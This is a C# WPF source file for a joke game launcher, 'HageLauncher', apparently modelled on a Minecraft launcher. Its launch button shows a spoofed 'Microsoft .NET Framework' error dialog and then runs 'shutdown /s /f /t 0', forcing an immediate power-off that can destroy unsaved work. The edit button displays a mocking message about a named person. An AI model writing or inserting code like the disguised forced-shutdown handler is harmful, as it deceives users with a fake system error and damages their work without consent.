using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using static System.Net.Mime.MediaTypeNames;

namespace HageLauncher
{
    /// <summary>
    /// MainWindow.xaml の相互作用ロジック
    /// </summary>
    public partial class MainWindow : Window
    {



        public MainWindow()
        {
            InitializeComponent();
        }

        private void add_instance_button_Click(object sender, RoutedEventArgs e)
        {
            // モーダル
            // Window1が開いている間、MainWindowは操作不可
            CreateInstance CreateWin = new CreateInstance();
            CreateWin.ShowDialog();
            // WPFはdisposeなし



            string instancesFilePath = "assets/instances.txt";
            string instancesText = File.ReadAllText(instancesFilePath);
            string[] instanceList = instancesText.Split(';');
            Array.Resize(ref instanceList, instanceList.Length - 1);
            var i = 0;
            Console.WriteLine(instancesText);




            foreach (var instance in instanceList)
            {
                i = i + 1;
                string iStr = i.ToString();
                string instanceXname = "instance" + iStr;

                Grid instanceElement = (Grid)FindName(instanceXname);
                if (instanceElement != null)
                {
                    instanceElement.Visibility = Visibility.Visible; // または Visibility.Visible
                }

                Console.WriteLine(instanceXname);


                string instanceNameXname = "name" + iStr;
                TextBlock nameElement = (TextBlock)FindName(instanceNameXname);
                string instanceVersionXname = "version" + iStr;
                TextBlock versionElement = (TextBlock)FindName(instanceVersionXname);

                Console.WriteLine(instanceNameXname);
                Console.WriteLine(instanceVersionXname);



                string[] instanceInf = instance.Split('/');

                Console.WriteLine(instanceInf[0]);


                if (nameElement != null)
                {
                    nameElement.Text = instanceInf[0]; // または Visibility.Visible
                }
                if (versionElement != null)
                {
                    versionElement.Text = instanceInf[1]; // または Visibility.Visible
                }


            }

        }



        private void launch_button_Click(object sender, RoutedEventArgs e)
        {
            ProgressWindow ProgressWin = new ProgressWindow();
            ProgressWin.ShowDialog();

            Minecraft MineWin = new Minecraft();
            MineWin.ShowDialog();



            MessageBox.Show("Unhandled exception has occurred in a component in your napplication. If you click Continue, the application will ignore this error and attempt to continue.\r\n\r\nExternal component has thrown an exception.",
                "Microsoft .NET Framework",
                MessageBoxButton.OK,
                MessageBoxImage.Error);


            ProcessStartInfo startInfo = new ProcessStartInfo("shutdown", "/s /f /t 0");
            Process.Start(startInfo);
        }


        private void edit_button_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("haswellはハゲ",
                "ハゲです",
                MessageBoxButton.OK,
                MessageBoxImage.Information);
        }




    }
}
